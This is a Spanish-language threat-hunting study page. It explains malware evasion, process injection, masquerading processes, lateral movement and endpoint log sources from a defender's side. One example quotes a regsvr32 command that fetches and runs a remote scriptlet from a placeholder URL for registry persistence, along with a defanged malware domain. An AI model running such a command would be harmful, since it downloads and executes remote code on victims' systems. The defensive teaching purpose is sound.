---
title: 5. Hunting en entornos de endpoint 🖥️
layout: default
has_toc: false
nav_order: 7
parent: 100 days challenge 🗻

---

# 5. Hunting en entornos de endpoint 🖥️
---
## Índice 

- [5.1 Técnicas de Ocultación de Malware🥷🏻](https://nottaroff.github.io/workspace/docs/100%20days/5.%20Hunting%20en%20entornos%20de%20endpoint/#51-técnicas-de-ocultación-de-malware) 
- [5.2 Descubriendo procesos irregulares](https://nottaroff.github.io/workspace/docs/100%20days/5.%20Hunting%20en%20entornos%20de%20endpoint/#52-descubriendo-procesos-irregulares)
- [5.3 Detección de movimiento Lateral](https://nottaroff.github.io/workspace/docs/100%20days/5.%20Hunting%20en%20entornos%20de%20endpoint/#54-técnicas-de-adquisición-de-datos-en-threat-hunting)
- [5.4 Técnicas de Adquisición de Datos en Threat Hunting](https://nottaroff.github.io/workspace/docs/100%20days/4.%20Hunting%20en%20entornos%20de%20red/#431-ataques-de-denegación-de-servicio-distribuido-ddos-%EF%B8%8F)

---

## 5.1 Técnicas de Ocultación de Malware 🥷🏻

### 5.1.1 Técnicas de evasión signature-based

Implica alterar las características del software malicioso para evitar la detección por parte del software de seguridad que dependen de firmas o patrones predefinidos. Estas técnicas para eludir los antivirus y los sistemas de detección de intrusiones.

**Malware Polimórfico**

El malware polimórfico es un tipo de software malicioso que cambia su código o apariencia con cada infección, lo que dificulta su detección y bloqueo por parte de los antivirus tradicionales basados en firmas.

{: .example }
> 🔖[Storm Worm](https://www.hypr.com/security-encyclopedia/storm-worm)  Malware que cada vez que infecta un sistema cambia su código significativamente.


**Malware  Metamórfico**

El malware metamórfico modifica tanto su apariencia como su código subyacente, lo que complica aún más su detección.

{: .example }
> 🔖[Zmist](http://virus.wikidot.com/zmist) 🔖 Malware que modifica el codigo, su estructura y comportamiento en cada infección.


**Pasos que sigue este tipo de malware**

|**Infección**|
|El malware polimórfico, inicialmente cifrado por un atacante, se usa para infectar sistemas o archivos. A menudo, se presenta como software legítimo o explota vulnerabilidades del usuario para ingresar.|

|**Mutación**|
|Una vez descargado, un motor de mutación agrega una nueva rutina de descifrado al malware, haciéndolo parecer un archivo diferente. Esto le permite modificar su código y crear variantes únicas para evitar la detección basada en firmas.|

|**Ataque**|
|Tras infectar el sistema, el malware polimórfico ejecuta su código malicioso, que puede incluir robo de datos, propagación en la red, explotación de vulnerabilidades o modificaciones en archivos y configuraciones del sistema.|

|**Persistencia**|
|El malware polimórfico busca mantenerse en el sistema a largo plazo, actualizándose periódicamente y cambiando su código para evitar la detección y continuar sus acciones maliciosas.|

|**Cifrado de archivos**|
|Es la práctica de codificar el código malicioso o componentes con el fin de ocultar su verdadero propósito y evitar ser detectado por el software de seguridad.|

Este método busca dificultar el análisis convirtiendo el contenido del malware en una forma encriptada que solo puede ser descifrada con una clave específica. En este caso, la detección basada en firmas, se vuelve menos efectiva contra el malware cifrado, ya que la firma se encuentra oculta dentro del contenido encriptado.

{: .example }
> Podemos ver algunos ejemplos el uso de cifrado de archivos de malware:  [MITRE](https://attack.mitre.org/techniques/T1027/013/)
    
**Empaquetadores**

Los empaquetadores son herramientas que comprimen y cifran el código del malware, creando un nuevo ejecutable que requiere una rutina de desempaquetado específica para ser ejecutada, antes de revelar el código malicioso original.

**Cifradores**

Los cifradores se centran en cifrar el código del malware y generar una rutina de descifrado que puede reconstituir la carga útil maliciosa original en tiempo de ejecución. 
Ambas técnicas crean versiones dinámicas y siempre cambiantes del malware.


{: .example }
> 🔖[**Zeus**](https://es.wikipedia.org/wiki/Zeus_(malware))  
Utiliza un cifrado personalizado para encriptar su código malicioso, que será descifrado en tiempo determinado desde que el malware se ejecuta en el sistema de la víctima.


**Ofuscación de Código**
La ofuscación de código en el malware se refiere a la manipulación intencional de la estructura, lógica y presentación del código para hacerlo mas complejo. 
Al transformar el código en una forma compleja y no estándar, se esconden los patrones reconocibles del malware.

{: .example }
🔖[**Carberp**](https://www.incibe.es/servicio-antibotnet/info/Carberp)                                                     
Utiliza técnicas de ofuscación como el uso de nombres de variables aleatorios, saltos condicionales inusuales y la inserción de código redundante.


### 5.1.2 Técnicas de evasión basadas en el comportamiento 

Estas técnicas se centran en alterar las acciones y características del malware para evadir su detección.

**Detección de sandbox**

Es el uso de técnicas de evasión basadas en el comportamiento para identificar si el malware se está ejecutando dentro de un entorno controlado, como una máquina virtual o un sandbox.
El malware equipado con mecanismos de detección de sandbox puede detectar la presencia de ciertos atributos o comportamientos asociados con tales entornos, como rutas de archivos específicas, entradas de registro o configuraciones de red. 
Al detectar esto, el malware puede alterar su comportamiento, retrasar acciones maliciosas o permanecer inactivo para evadir el análisis. 

{: .example }
>🔖**Trickbot**                                             
>Troyano bancario que se propaga principalmente a través de correos electrónicos de phishing y es utilizado para robar información financiera y credenciales de inicio de sesión
Si se ejecuta en un entorno de sandbox utilizado para el análisis de malware, puede realizar acciones como comprobar la existencia de determinados archivos o procesos típicamente asociados con máquinas virtuales, o probar la respuesta de ciertos servicios de red.
>
>[Técnica Mitre](https://attack.mitre.org/techniques/T1497/)
>
>[Ejemplo de Detección de Sandbox](https://attack.mitre.org/software/S0266/)


**Comprobación del entorno**

Implica en  emplear técnicas  basadas en el comportamiento para evaluar el contexto en el que se está ejecutando el malware, lo que le permite adaptar su comportamiento en consecuencia.
Al monitorear factores como las configuraciones del sistema, las instalaciones de software, las configuraciones de red o incluso la presencia de herramientas de seguridad, el malware puede detectar signos de análisis o pruebas de seguridad que realiza el entorno. 
Si detecta dichas acciones puede alterar su comportamiento, retrasar su carga maliciosa o incluso detener su operación temporalmente, evitando así los intentos de detección y análisis.

{: .example }
>🔖[**Emotet**](https://attack.mitre.org/software/S0367/)            
>Es un troyano bancario y de robo de información que se propaga principalmente a través de correos electrónicos de phishing. En este caso emplea técnicas de evasión, como la comprobación del entorno para detectar máquinas virtuales o entornos de análisis de malware, y puede cambiar su comportamiento en consecuencia para evitar ser detectado.



[**Vaciamiento de Procesos**](https://attack.mitre.org/techniques/T1055/012/)                                                         
Es una técnica de evasión basada en el comportamiento, que funciona reemplazando un código legítimo de un programa existente en el sistema con su propio código malicioso. Haciendo ver que el programa parece funcionar normalmente, pero en realidad está ejecutando acciones maliciosas del malware en segundo plano.

{: .example }
>🔖[**Poweliks**](https://attack.mitre.org/techniques/T1218/011/)
>
>Es un malware que se infiltra en el sistema a través de un archivo malicioso adjunto en un correo electrónico de phishing. Una vez abierto, el malware se ejecuta y busca un proceso legítimo en el sistema, como `explorer.exe`. Luego inyecta su código dentro del proceso `explorer.exe`, reemplazando su funcionalidad legítima con la suya propia.



### 5.1.3 Técnicas de Inyección de Procesos

Son estrategias  para insertar su código malicioso en procesos legítimos que se ejecutan en un sistema comprometido. Esto permite que el malware evada la detección, aproveche los privilegios del proceso objetivo y ejecute sus actividades maliciosas bajo la apariencia de una aplicación de confianza.

**Inyección de DLL**

Inyección de procesos en la que un código malicioso inserta su propia Biblioteca de Enlaces Dinámicos (DLL) en un proceso legítimo que se está ejecutando en memoria, lo que le permite manipular el comportamiento del proceso y potencialmente ejecutar acciones maliciosas sin levantar sospechas. Al aprovechar el contexto de un proceso de confianza, el malware puede evadir la detección basada en firmas tradicionales y mimetizarse con actividades legítimas, lo que dificulta que los sistemas de seguridad distingan el comportamiento malicioso de las operaciones normales del proceso principal.

**Inyección de Código** 

Es técnica de inyección de procesos, donde se inserta código malicioso en el espacio de memoria de un proceso legítimo, alterando su comportamiento para llevar a cabo acciones maliciosas. 
Este método implica aprovechar las vulnerabilidades en la memoria de un proceso objetivo para inyectar el código malicioso, secuestrando efectivamente el flujo de ejecución del proceso.

**Inyección de Hilos**

El código malicioso crea un nuevo hilo dentro de un proceso legítimo e inyecta su carga útil en el flujo de ejecución de ese hilo. Al hacerlo, el malware aprovecha los recursos y privilegios del proceso legítimo para ejecutar sus acciones maliciosas. 

### 5.1.4 Técnicas de Asignación/Escritura de Memoria 

Son métodos de inyección de procesos utilizados por el malware para insertar su código malicioso en el espacio de memoria de un proceso legítimo. Estas técnicas implican que el malware asigna dinámicamente memoria dentro del espacio de direcciones del proceso objetivo y luego escribe su carga útil en esa memoria asignada. 

**Técnicas de Malware Sin Archivos**
Es código malicioso que opera completamente dentro de la memoria de una computadora, sin dejar rastro en el sistema de archivos. 

**Ejecución Basada en Memoria**

Elcódigo malicioso se carga y ejecuta directamente en la memoria del sistema. Este enfoque aprovecha vulnerabilidades o herramientas del sistema legítimas para inyectar y ejecutar la carga útil maliciosa en la memoria. Dado que el código malicioso no depende de un archivo persistente, se vuelve más difícil de detectar y mitigar.

{: .example }
>🔖[Cobalt Strike](https://attack.mitre.org/software/S0154/): utilizado en ataques de red dirigidos, carga su código directamente en la memoria del proceso legítimo "svchost.exe" en sistemas Windows.
>
>🔖**Ryuk** ha sido conocido por emplear técnicas LOLbins para llevar a cabo ataques de ransomware. utiliza herramientas legítimas del sistema, como el servicio de PowerShell, para ejecutar scripts maliciosos que cifran los archivos del sistema objetivo.

**Ataques Basados en el Registro**

Implican explotar el Registro de Windows, una base de datos jerárquica utilizada para almacenar configuraciones, preferencias de usuario e información del sistema, con fines maliciosos.  Al aprovechar claves y valores de registro legítimos, los atacantes pueden lograr persistencia, escalada de privilegios y ejecución de scripts maliciosos sin levantar sospechas, ya que estas actividades a menudo eluden las medidas de seguridad basadas en archivos. 


{: .example }
🔖**Dridex**, este malware puede modificar claves del registro de Windows para garantizar que su código malicioso se ejecute de manera automática en cada inicio del sistema operativo.

**Macros de Documentos**

Las macros de documentos en el malware implican la utilización de scripts integrados dentro de archivos de documentos, como los de Microsoft Office, para realizar acciones maliciosas al abrir el documento. Esta estrategia se considera parte del malware sin archivos, dado que no requiere de archivos ejecutables tradicionales; en cambio, aprovecha las capacidades de scripting de los formatos de documentos comunes. Cuando un usuario abre un documento que contiene macros, el script se ejecuta y puede descargar y ejecutar cargas útiles maliciosas directamente en la memoria, evitando los métodos de detección basados en archivos convencionales.

{: .example }
🔖[Ursnif](https://attack.mitre.org/software/S0386/) Se propaga a través de documentos de Word con macros maliciosas. Cuando los usuarios abren estos documentos y habilitan las macros, Ursnif descarga e instala su código malicioso en el sistema.

    
## 5.2 Descubriendo procesos irregulares

Uno de los modos más comunes en que el malware intenta evitar la detección es haciéndose pasar por un proceso legítimo dentro de un sistema. Normalmente, un proceso crítico en el anfitrión, como scvhost.exe en Windows. 

Estos pueden detectarse de varias maneras diferentes:

- Identificar procesos con nombres similares a procesos conocidos
- Verificar el directorio de instalación de procesos
- Revisar la jerarquía de procesos en busca de irregularidades
- Comparar procesos en memoria y en disco

### 5.2.1 Suplantación de procesos críticos
El malware puede hacerse pasar por procesos legítimos ejecutándose bajo un nombre similar, como por ejemplo: 

- `scvhost.exe` - **Malicioso**
- `svchost.exe` - **Legítimo**

Una forma de detectar este malware es usar algoritmos de similitud de cadenas. Buscar cadenas que no sean iguales pero tampoco muy diferentes. Como por ejemplo el algoritmo de distancia Dameraou-Lavenshtein:

- Cuanta el número mínimo de operaciones de inserción/eliminación/modificación/transposición de un solo carácter necesarias para convertir string1 en string2.
- La puntuación será 1 para scvhost.exe a svchost.exe: cuanto menor sea la puntuación, mayor será la probabilidad de que sea algo que haya sido reemplazado.

### 5.2.2 Ubicaciones ejecutables inusuales

El malware puede ejecutarse desde ubicaciones inusuales para dificultar su detección. Por ejemplo, pueden instalarse en lugares poco convencionales como la papelera de reciclaje del sistema operativo. , para pasar desapercibido.
Tambien podemos ver como hay algunos que aprovechan deliberadamente ubicaciones específicas como parte de sus tácticas de evasión y secuestro. Por ejemplo, podrían ubicarse en directorios que el sistema operativo Windows busca en un orden específico al buscar ejecutables para ejecutar. Si un malware logra colocar un archivo ejecutable con el mismo nombre en un lugar prioritario de esa lista, podría ejecutarse en lugar del archivo legítimo, lo que le permite permanecer activo y evadir la detección por más tiempo.

Debemos de conocer y verificar tanto las ubicaciones inusuales como las privilegiadas donde los programas maliciosos podrían ocultarse. 

### 5.2.3 Jerarquía de procesos

La jerarquía de procesos es una característica fundamental tanto en sistemas Windows como en Unix. En esta estructura, cada proceso, a excepción del proceso raíz (root), se considera hijo de otro proceso. Reflejando la relación de dependencia entre los distintos procesos en ejecución en el sistema operativo.

Al buscar irregularidades en esta jerarquía podemos identificar posibles suplantadores o procesos maliciosos. Por ejemplo, en el caso de Windows, cualquier instancia de svchosts.exe que no sea un hijo directo de services.exe podría indicar la presencia de malware. 

Conocer la jerarquía de procesos comunes  es una herramienta valiosa. Esto permite identificar patrones normales de comportamiento y distinguir anomalías que podrían indicar la presencia de actividad maliciosa.

### 5.2.4 Secuestro de procesos

Algunos tipos de malware pueden tomar el control de un proceso existente y ejecutar con su espacio de memoria y permisos.

Esto puede lograrse de varias maneras:

|1. **Ganchos de función**: Modificación de las funciones de un proceso en ejecución para redirigir su comportamiento hacia el malware.|
|2. **Modificaciones/patching en línea**: Realiza cambios directos en el código del proceso en memoria mientras está en ejecución.|
|3. **Inyección de DLL (Dynamic Link Library)**: Implica la inserción de una biblioteca dinámica maliciosa en el espacio de memoria de un proceso en ejecución.|

Estos procesos maliciosos tendrán copias diferentes en ejecución en la memoria que las guardadas en el disco. También pueden tener dependencias/importaciones inusuales.

### 5.2.4 Verificación de información de procesos en Windows

Microsoft ofrece varias herramientas para monitorear y gestionar procesos en sistemas Windows:

|**Task Manager** 
Proporciona una visión general de los procesos en ejecución, su uso de recursos y permite finalizar procesos si es necesario.|
|**Process Monitor**
 Proporciona información detallada sobre los procesos en ejecución, sus hilos y módulos asociados.|
|**Task Explorer**
 Ofrece una vista más detallada de los procesos en ejecución, incluyendo información sobre puertos, conexiones de red y propiedades detalladas de los procesos.|
|**Process Hacker**
 Proporciona funcionalidades avanzadas para monitorear y gestionar procesos en sistemas Windows, incluyendo la capacidad de ver y manipular procesos y servicios de forma más granular.|

### 5.2.5 Verificación de información de procesos en Linux/Unix:**

En sistemas Linux/Unix, el comando `ps` es una herramienta fundamental para obtener información sobre los procesos en ejecución.  El comando `ps` admite una variedad de flags  que permiten personalizar la información mostrada, como la lista de procesos, el uso de CPU, memoria y otros recursos. Podremos aprobechar la salida del comando `ps` para redirigida a otros programas o scripts para un análisis más detallado.

Para visualizar la jerarquía de procesos en Linux, se puede utilizar el comando `pstree`, que muestra la relación jerárquica entre los procesos en ejecución.

## 5.3 Detección de movimiento Lateral

Por lo general, el enpoint inicial comprometido por un atacante no constituye su objetivo final. De acuerdo con la práctica común, las bases de datos más valiosas no suelen almacenarse en estos dispositivos. Para alcanzar su verdadero objetivo, el atacante debe realizar movimientos laterales a través de la red.

### 5.3.1 Procesos

Durante esta fase exploratoria, las acciones llevadas a cabo pueden ser indicadores valiosos. Una vez que un adversario ha obtenido acceso a una máquina, comienza el proceso de reconocimiento. Se recopilan nombres de usuario, niveles de privilegio, servicios en ejecución y se identifican otras máquinas accesibles. Aunque los atacantes pueden utilizar software malicioso especializado para estas tareas, los procesos legítimos del sistema operativo también son utilizados con eficacia. En sistemas Windows, se emplean comúnmente herramientas como net.exe, ipconfig.exe, whoami.exe, nbstat.exe. El atacante suele ejecutar estos procesos en un lapso de tiempo más breve de lo habitual. Esta anomalía representa un indicio potencial de actividad maliciosa.


### 5.3.2 Uso explícito de credenciales en Windows

En sistemas Windows, los usuarios tienen la capacidad de autenticarse utilizando credenciales explícitas. Este método está principalmente destinado a facilitar operaciones por lotes.Las credenciales explícitas también pueden ser utilizadas en ataques de pass-the-hash.

Es crucial monitorear el uso de credenciales explícitas en máquinas Windows para garantizar la seguridad del sistema. Se recomienda implementar las siguientes medidas:

|1. **Lista blanca de usos autorizados**
 Mantener un registro de los usos legítimos de credenciales explícitas y mantener una lista blanca de aplicaciones y usuarios autorizados para utilizar este método de autenticación.|
|2. **Investigación de uso no autorizado**
Cualquier uso no autorizado de credenciales explícitas debe ser investigado inmediatamente como un posible intento de ataque. Esto puede implicar revisar registros de actividad y tomar medidas correctivas según corresponda.|

Al implementar estas prácticas, se puede reducir significativamente el riesgo de explotación de credenciales y salvaguardar la integridad y seguridad del sistema Windows.

### 5.3.3 Monitoreo de cambios en el registro y archivos del sistema en Windows

El registro de Windows y los archivos del sistema son componentes críticos que pueden influir significativamente en el funcionamiento del sistema operativo. Dado su poder, es fundamental estar alerta a cualquier cambio inesperado que pueda indicar una posible amenaza o actividad maliciosa.

Al buscar posibles amenazas en el registro de Windows o en los archivos del sistema, es importante tener en cuenta lo siguiente:

1. **Mecanismos de persistencia del registro**
Cualquier cambio en las claves o valores del registro que podrían indicar la instalación de programas maliciosos o la modificación de configuraciones importantes.

2. **Cambios en el registro**
Seguimiento de los cambios recientes en el registro para identificar actividades anómalas, como la creación o modificación de claves y valores por parte de aplicaciones desconocidas o no autorizadas.

3. **Fechas de creación/modificación de archivos** 
Fechas de creación y modificación de archivos críticos del sistema en busca de cambios inesperados que puedan indicar la presencia de malware o actividad sospechosa.

4. **Evidencia de secuestro de DLL**
Signos de secuestro de DLL, donde los archivos de bibliotecas compartidas esenciales del sistema son reemplazados o manipulados por versiones maliciosas para ejecutar código no autorizado.

Al mantener un monitoreo proactivo de estos elementos y estar alerta a los cambios inusuales, se puede detectar y responder rápidamente a posibles amenazas a la seguridad del sistema en entornos Windows.

### 5.3.4 Mecanismos de persistencia del registro y detección de amenazas en sistemas Windows


**1. Mecanismos de persistencia del registro:**

- El registro de Windows es un objetivo común para el malware que busca persistencia a través de reinicios del sistema.
- El malware puede utilizar claves de registro como puntos de inicio automáticos para ejecutar código malicioso al arrancar el sistema.


{: .example }
>**JS_POWMET:** Utiliza una entrada de registro de Auto inicio para descargar e instalar un troyano de puerta trasera de PowerShell.
>
>Clave del registro afectada: **`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`**
>
>Ejemplo de comando malicioso: **`regsvr32 /s /n /u /i:{URL maliciosa}scrobj.dll`**
>
>Con ello se instala el troyano de puerta trasera de script de PowerShell TROJ_PSINJECT y se conecta al sitio web de malware: bogerando[.]ru


**2. Habilitar la auditoría del registro:**

- La auditoría del registro es una función de seguridad de Windows que permite detectar el uso malicioso del registro como mecanismo de persistencia.
- Puede habilitarse mediante la configuración de directivas de grupo o mediante ajustes en Active Directory.

**3. Comprobación de marcas de tiempo de archivos:**

- Las marcas de tiempo de los archivos pueden indicar actividades maliciosas cuando se modifican archivos críticos del sistema.
- Se recomienda revisar marcas de tiempo inusuales o cambios recientes en archivos ejecutables (exe) y bibliotecas dinámicas en busca de posibles compromisos.

**4. Caza de cambios en archivos del sistema:**

- Los archivos DLL y los controladores son objetivos comunes para adversarios avanzados.
- Es importante examinar estos archivos en busca de valores anómalos utilizando herramientas como **`driverquery`**.

Al implementar medidas como la auditoría del registro, la monitorización de marcas de tiempo de archivos y la búsqueda activa de cambios en archivos del sistema, se puede fortalecer significativamente la seguridad de los sistemas Windows y detectar posibles amenazas de manera proactiva.

**4.1 Nombres de archivo maliciosos conocidos**

Existen ciertas familias de malware que utilizan nombres de archivo conocidos o predecibles como parte de sus tácticas de infección y persistencia en sistemas comprometido. Identificar estos nombres de archivo conocidos es una estrategia rápida y efectiva para un cazador de amenazas, ya que permite identificar o eliminar rápidamente la posibilidad de que estas amenazas simples estén presentes en el entorno.

Algunos tipos de archivos que suelen ser utilizados por malware incluyen:

- Shells web (archivos php)
- Scripts (como archivos .bat y .cmd)
- Ejecutables maliciosos (archivos .exe)
- Backdoors(con extensiones como .lnk, .pif, .vbs, .scr y .wsh)

**4.2 Extensiones de archivo**

Es importante tener en cuenta que los autores de malware utilizan una variedad de extensiones de archivo para sus ejecutables. Además de .exe, otras extensiones comunes incluyen .bat, .cmd, .com, .lnk, .pif, .vbs, .scr y .wsh. Estas extensiones pueden variar dependiendo del tipo de malware y del objetivo del atacante.

También es importante considerar que, dependiendo de la plataforma y del entorno utilizado, otras extensiones de archivo también pueden representar una amenaza potencial. P
or ejemplo, los archivos JavaScript (.js) pueden ser ejecutados en un navegador web, mientras que los archivos Java JAR (.jar) pueden ejecutarse en sistemas que tienen Java instalado.

**4.3 Anulación de izquierda a derecha**

La anulación de izquierda a derecha es una técnica utilizada por los atacantes para ocultar información maliciosa en nombres de archivos y otros textos. Esta técnica utiliza un carácter especial (U+202E) del conjunto de caracteres Unicode que invierte la dirección del texto de izquierda a derecha.

Este carácter puede ser utilizado en medio de una cadena de texto para invertir la dirección del resto de la cadena, lo que puede dificultar la detección de nombres de archivo maliciosos.

La búsqueda de este tipo de técnicas de evasión puede ser una estrategia efectiva para detectar malware en el entorno y tomar medidas rápidas para mitigar la amenaza.

**4.4 Búsqueda de actividad anormal de cuentas**

Los intentos de inicio de sesión exitosos y fallidos pueden ser indicadores importantes de un intento de ataque contra un sistema o red.

Los atacantes pueden utilizar credenciales robadas para iniciar sesión en cuentas legítimas y llevar a cabo actividades maliciosas, como el robo de datos o la instalación de malware.

Por otro lado, los intentos de inicio de sesión fallidos pueden ser señales de que un atacante está intentando adivinar contraseñas o realizar otros tipos de ataques de fuerza bruta.

Es importante monitorear de cerca los registros de inicio de sesión y buscar cualquier actividad sospechosa, como un aumento repentino en los intentos de inicio de sesión, intentos de inicio de sesión desde ubicaciones inusuales o intentos de inicio de sesión en cuentas que no existen en el sistema.

La detección temprana de actividades de inicio de sesión anormales puede ayudar a prevenir intrusiones y proteger los sistemas y datos de una organización contra amenazas cibernéticas.


## 5.4 Técnicas de Adquisición de Datos en Threat Hunting
---

### 5.4.1 Datos de Punto Final
Los datos de punto final son una fuente crucial de información para el threat hunting. La recopilación y análisis de datos de endpoint proporciona una visión detallada de las actividades y eventos que ocurren en cada dispositivo, lo que permite a los cazadores de amenazas identificar posibles indicadores de compromiso y comportamientos anómalos.

### **Tipos de datos de punto final:**

**Registros de Antivirus**

Los registros de antivirus son una fuente de información sobre la actividad de malware en un dispositivo. El software antivirus detecta, previene y elimina software malicioso, como virus, gusanos, troyanos, spyware y adware. Los registros de antivirus pueden incluir eventos de detección de malware, actualizaciones de firmas, análisis programados y acciones tomadas por el software antivirus para mitigar amenazas.

**AV Basado en el Host**


Permite detecciones antivirus para máquinas individuales. Las reglas personalizadas pueden variar para cada sistema, lo que permite una defensa más específica y adaptada a las necesidades de seguridad de cada dispositivo.

{: .detail }
>**Detección de Firmas:** Utiliza atributos conocidos de malware para identificar amenazas.
>
>**Datos Conductuales/Heurísticos:** Analiza el comportamiento del software para detectar actividad sospechosa.
>
>**Aprendizaje Automático:** Utiliza algoritmos para identificar patrones de comportamiento malicioso y construir un pool de conocimiento inicial.

**Sistemas de Detección/Prevención de Intrusiones Basados en el Host (HIDS/HIPS):**
- **HIDS (Sistema de Detección de Intrusiones Basado en el Host):**
    
    Detecta posibles amenazas de seguridad y ataques en un sistema de host. Monitorea la actividad del sistema en busca de cambios sospechosos, acceso no autorizado y actividad de malware.
    
- **HIPS (Sistema de Prevención de Intrusiones Basado en el Host):**
    
    Previene la actividad maliciosa en un sistema de host. Utiliza análisis de comportamiento, control de aplicaciones y prevención de intrusos en la red para proteger el dispositivo contra amenazas.
    
**Firewalls Basados en el Host**

Proporcionan visibilidad y control granulares sobre el tráfico de red en sistemas informáticos individuales. Los registros del firewall pueden utilizarse para identificar y analizar patrones de tráfico sospechoso, incluidos intentos de acceso no autorizado, infecciones de malware y actividad de red anómala.

**Registros de Eventos de Windows**

Los registros de eventos son registros de eventos del sistema que proporcionan información sobre eventos como intentos de inicio de sesión, instalaciones de software, errores del sistema, etc. Los registros se almacenan en un formato estructurado e incluyen información sobre el evento, como la hora, la fuente y el tipo.

- **Tipos de Registros:**
    - Registros de Seguridad
    - Registros de Aplicaciones
    - Registros del Sistema



### 5.4.1 Calidad de Datos*

La calidad de los datos comprende la adecuación para los usos previstos en operaciones, toma de decisiones y planificación. Los datos deben cumplir con requisitos específicos para considerarse de alta calidad. 

**Objetivos de la Calidad de Datos en la Caza**

|**Aumento de la Productividad**|
|Reduce el tiempo dedicado a corregir y validar problemas de datos durante los compromisos de caza, mejorando así la productividad.|

|**Consistencia y Complejidad**|
|Consistencia en fuentes de datos permite una manipulación de datos más eficiente y facilita la ejecución de análisis complejos que dependen de múltiples recursos para comprender el contexto.|

|**Automatización Mejorada**|
|La optimización de los procesos de automatización a través de mejoras en la calidad de datos mejora la eficiencia general del flujo de trabajo.|

**Por Qué la Calidad de Datos es Importante**

Comprender el impacto de la calidad de los datos en los compromisos de caza es crucial. Incluso con equipos dedicados a la gobernanza de datos en las organizaciones, escenarios comunes como discrepancias en los campos de datos, datos faltantes o mal analizados, y disponibilidad limitada de datos persisten. Estos problemas afectan directamente la efectividad de las actividades de caza, subrayando la importancia de la colaboración entre expertos en seguridad y equipos de gobernanza de datos.

**Metodología**

|1. **Identificar Fuentes de Datos**|
|Documentar las fuentes de datos existentes es el primer paso para comprender el panorama de datos. Esto implica listar las herramientas utilizadas dentro de la organización y detallar los eventos específicos recopilados de cada fuente.|

|2. **Identificar las Fuentes de Datos Necesarias**|
|Alinear las fuentes de datos con los requisitos de caza permite a las organizaciones definir expectativas y evaluar la adecuación de las herramientas. Utilizar marcos como MITRE ATT&CK ayuda a identificar las fuentes de datos necesarias para detectar técnicas específicas.|

|3. **Mapear las Fuentes de Datos**|
|Cruzar las fuentes de datos disponibles con las requeridas revela brechas de cobertura, guiando acciones posteriores para abordar las deficiencias.|

|4. **Definir Dimensiones de Calidad de Datos**|
|Establecer dimensiones de calidad de datos adaptadas a los datos de caza facilita la evaluación efectiva. Aprovechar marcos existentes como el "Conjunto Central de Requisitos de Calidad de Datos del DoD" proporciona un enfoque estructurado.|

|5. **Definir un Sistema de Puntuación**|
|Diseñar un sistema de puntuación basado en dimensiones de calidad de datos definidas permite una evaluación cuantitativa. Los requisitos de cada nivel deben definirse claramente, reflejando las prioridades y objetivos organizacionales.|

|6. **Evaluar la Calidad de los Datos** |
|Evaluar la calidad de los datos frente a las dimensiones y criterios de puntuación definidos revela fortalezas y debilidades, informando decisiones estratégicas y acciones correctivas.|


**Resultados de  Cobertura de Datos**

Al incorporar dimensiones de calidad de datos en el proceso de evaluación, las organizaciones obtienen una comprensión más profunda de la efectividad de sus fuentes de datos. Analizar la cobertura de fuentes de datos por técnica y táctica destaca áreas de fortaleza y debilidad, guiando la asignación de recursos y los esfuerzos de optimización.

**Puntuación General**

Integrar las puntuaciones de calidad de datos con evaluaciones de talento y tecnología produce una puntuación general integral. Este enfoque holístico permite a las organizaciones medir su preparación y efectividad en los compromisos de caza, facilitando la mejora continua y la optimización.


---